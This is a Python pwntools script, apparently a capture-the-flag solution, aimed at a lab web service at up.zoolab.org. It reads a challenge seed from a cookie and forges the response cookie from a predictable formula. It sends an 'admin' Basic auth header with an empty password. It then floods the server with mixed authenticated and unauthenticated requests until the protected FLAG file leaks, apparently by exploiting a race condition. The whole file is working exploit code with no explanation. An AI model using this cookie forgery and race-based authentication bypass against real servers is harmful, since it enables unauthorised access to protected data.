from pwn import *
import base64
import time

# context.log_level = 'debug'

def compute_cookie(seed):
    return ((seed * 6364136223846793005) + 1 & 0xFFFFFFFFFFFFFFFF) >> 33

def create_auth():
    raw = f"admin:".encode()
    return base64.b64encode(raw).decode()

if __name__ == "__main__":

    # connect to the remote service
    r = remote('up.zoolab.org', 10933)

    # send a request to get cookie
    r.send(b"GET /secret/FLAG.txt HTTP/1.1\r\nHost: up.zoolab.org\r\n\r\n")

    resp = r.recv(timeout=1).decode()

    # find challenge inside the response
    key = "Set-Cookie: challenge="
    start = resp.find(key)
    if start != -1:
        start += len(key)
        end = resp.find(';', start)
        seed_str = resp[start:end] if end != -1 else resp[start:]
        seed = int(seed_str.strip())
    else:
        raise ValueError("challenge cookie not found")
    
    # print(seed)

    # create cookie and authorization
    cookie = compute_cookie(seed)
    auth = create_auth()

    unauth_req = (
        "GET / HTTP/1.1\r\n"
        "Host: up.zoolab.org\r\n"
        "\r\n"
    )

    auth_req = (
        "GET /secret/FLAG.txt HTTP/1.1\r\n"
        "Host: up.zoolab.org\r\n"
        f"Authorization: Basic {auth}\r\n"
        f"Cookie: response={cookie}\r\n"
        "\r\n"
    )

    while True:

        for _ in range(50):
            r.send(auth_req.encode())
            r.send(auth_req.encode())
        
        time.sleep(0.5)
        r.send(unauth_req.encode())

        data = r.recvuntil(b"It Works!")
        start = data.find(b"FLAG")

        if start != -1:
            print(data[start:start+38])
            break

    r.close()
